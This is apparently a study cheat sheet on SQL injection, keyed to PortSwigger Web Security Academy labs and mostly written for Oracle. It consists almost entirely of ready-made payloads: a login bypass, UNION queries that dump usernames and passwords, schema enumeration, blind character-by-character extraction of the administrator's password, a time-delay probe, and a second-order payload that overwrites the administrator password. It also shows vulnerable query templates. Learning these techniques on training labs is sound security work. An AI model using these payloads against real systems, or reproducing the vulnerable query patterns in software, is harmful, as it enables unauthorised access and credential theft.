https://portswigger.net/web-security/sql-injection  
*Note: all code below are meant for OracleDB (except `information_schema` related), please check [Syntax Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for other variants'*  

### WHERE Clause
`SELECT * FROM products WHERE category = '{}' AND released = 1`  
Attack (GET URL): ?category='+OR+1%3d1--  

### Login Bypass (Subvert Logic)
`SELECT * FROM users WHERE username = '{}' AND password = '{}'`  
Attack (POST Method): username=administrator'--&password=123  

### UNION Attacks
**Conditions**  
1. Both queries must return same number of columns  
`ORDER BY {index number}`  
2. Compatible data types in each column  
`UNION SELECT NULL,'a',NULL,NULL`  

**Techniques**  
1. Retrieving multiple values within a single column (concatenation)  
`UNION SELECT NULL,username||'~'||password FROM users`  

### Examine Database
`SELECT banner FROM v$version`  
`SELECT table_name FROM all_tables`  
`SELECT column_name FROM all_tab_columns WHERE table_name='{}'`  

**Non-Oracle DB:**  
`SELECT table_name FROM information_schema.tables`  
`SELECT column_name FROM information_schema.columns WHERE table_name='{}'`  

### Blind SQLi
Backend Query: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{}'`  

**Techniques**  
1. Conditional Responses  
possible due to observable difference in response  
`' AND '1'='1`  
`' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a`  
2. Conditional Responses by triggering SQL errors  
possible due to mishandling of SQL errors  
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` (check if username 'administrator' exists)  
`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
3. Time Delays  
possible due to synchronous processing of SQL queries  
**MySQL:** `'; IF (1=1) SELECT SLEEP(10)--`  

### Second-order SQLi
Input is safely handled initially and stored in database, but when data is later accessed and processed...  
*Username:* `badguy'; UPDATE users SET password='letmein' WHERE user='administrator'--`  
Backend Query: `SELECT * from user_options WHERE username='{}'`
